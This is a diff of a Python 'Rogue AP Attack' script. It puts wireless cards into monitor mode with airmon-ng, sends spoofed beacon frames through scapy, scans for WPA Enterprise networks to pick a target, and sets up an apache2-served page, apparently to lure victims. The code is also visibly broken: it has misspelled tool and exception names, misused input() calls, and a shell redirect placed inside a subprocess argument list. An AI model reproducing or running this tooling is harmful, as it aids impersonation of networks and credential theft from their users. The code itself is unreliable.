@@ -1,53 +1,44 @@
 from scapy.all import *
 
-import argparse
 import subprocess
 import sys
-import time
-import os
 
 DEAULT_CHANNEL = 6
-CAPTURE_FILE = "capture.pcap"
-DNSMASQ_CONF = "/tmp/dnsmasq.conf"
-HOSTAPD_CONF = "/tmp/hostapd.conf"
 HTML_PAGE =  "./index.html"
-
+INTERFACE = "wlan0"
+TARGET = "" 
+TARGET_FILE = "target_file.txt"
 
 class WfiRguAP:
-    def monitor_mode(self, interface):
-        print(f"[+] Activation Monitor mode on {interface}")
+    def monitor_mode(self):
+        print(f"[+] We need interface to target : ")
+        input(INTERFACE)
+        if INTERFACE == "": 
+            INTERFACE = "wlan0"
+        print(f"[+] Activation Monitor mode on {INTERFACE}")
         try:
             subprocess.run(['airmon-ng', 'check', 'kill'], check=True)
-            subprocess.run(['airmon-ng', 'start', interface], check=True)
-            return f"{interface}mon"
+            subprocess.run(['airmon-ng', 'start', INTERFACE], check=True)
+            return f"{INTERFACE}"
         except subprocess.CalledProcessErrora as e:
             print(f"[-] Error during configuration of monitor mode")
             sys.exit(1)
 
+    def scanning(self):
+        print(f"[+] Scanning network to find WPA Enterprise")
+        try:
+            subprocess.run(['airodumb-ng', '--encrypt', 'WPA2', INTERFACE, '>', TARGET_FILE])
+            stop_scanning = input()
+            if stop_scanning == "stop":
+                return f"Test"
+        except subprocess.CalledProcessError as e :
+            print(f"[-] Error during network scanning")
+            sys.exit(1)
 
-
-
-
-def interface(target_ssid, target_MAC):
-    iface = "wlan0mon"
-    sender_mac =  RandMAC()
-    ssid = target_ssid
-    dot11 = Dot11(type=0,subtype=8, addr1=target_MAC, addr2= sender_mac, addr3=sender_mac)
-    beacon = Dot11Beacon()
-    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
-    frame= RadioTap()/dot11/essid
-    sendp(frame, inter=0.1,iface=iface, loop=1) 
-
-    parser = argparse.ArgumentParser(
-    prog=' Wfi Rgue AP',
-    description='Rogue AP Attack')
-
-    parser.add_argument('-t', '--target', required=True, help='Name Target')
-    parser.add_argument('-s', '--ssid', required=True, help='SSID target')
-    parser.add_argument('-m', '--monitor', required=True, help='Monitor mode')
-    parser.add_argument('-c', '--channel', type=int, default=DEAULT_CHANNEL)
-
-    args = parser.parse_args()
+    def choice_target(self):
+        subprocess.run(['cat', TARGET_FILE])
+        print(f"[+] Select target Network >")
+        input(TARGET)
 
 
 def init_apache2():
@@ -66,4 +57,9 @@ def start():
 
 
 if __name__ == "__main__":
+    input(INTERFACE)
+    rogueAP = WfiRguAP
+    rogueAP.monitor_mode()
+    rogueAP.scanning()
+    rogueAP.choice_target()
     start()
